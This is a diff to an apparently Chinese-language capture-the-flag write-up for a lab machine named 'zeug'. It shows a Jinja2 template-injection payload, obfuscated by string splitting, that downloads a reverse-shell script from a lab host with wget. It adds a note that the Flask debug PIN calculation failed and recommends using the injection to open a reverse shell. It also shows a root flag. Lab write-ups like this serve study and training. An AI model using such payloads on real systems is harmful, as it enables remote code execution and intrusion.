@@ -838,8 +838,13 @@ class DebuggedApplication:
 
 ```plaintext title=""
 {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"wget 192.168.56.102/reverse.sh -o /home/co"+"sette/reverse.sh\").read()")}}
-
 ```
+
+:::warning 未知的 PIN 计算问题
+
+根据所得到的环境信息，我尝试对 Flask Debug Console 的 PIN code 进行计算，确认过计算的脚本就是来自 Flask 源码，但是计算出来的 PIN Code 不被 Flask Debug Console 所接受，这里可能存在一定的处理问题，建议直接使用 SSTI 构造命令执行，上传反弹 shell 的脚本，然后直接反弹 shell
+
+:::
 
 ## User - cosette
 
@@ -973,6 +978,6 @@ root
 ### flag - root
 
 ```shell
-root@zeug:~# cat root.txt 
+root@zeug:~# cat root.txt
 HMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}
 ```
